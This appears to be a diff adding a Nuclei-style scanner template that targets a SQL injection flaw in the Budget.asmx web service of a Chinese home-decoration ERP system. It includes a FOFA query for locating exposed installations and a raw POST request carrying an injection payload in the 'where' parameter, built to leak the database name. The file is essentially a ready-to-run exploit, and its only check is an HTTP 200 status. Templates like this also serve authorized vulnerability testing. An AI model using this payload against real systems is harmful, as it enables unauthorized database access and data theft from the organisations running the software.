@@ -1,0 +1,32 @@
+id: poc-vh165cn0232ga0ix
+info:
+  name: 装盟科技-家装ERP管理系统 Budget.asmx 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vh165cn0232ga0ix'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: vh165cn0232ga0ix
+    fofa: app="装盟科技-家装ERP管理系统"
+http:
+- raw:
+  - 'POST /WEB_SERVICE/Budget.asmx/getFixedBaseInfo HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Encoding: gzip
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 44
+
+
+    where=1=db_name()&intPageIndex=1&pageSize=20'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
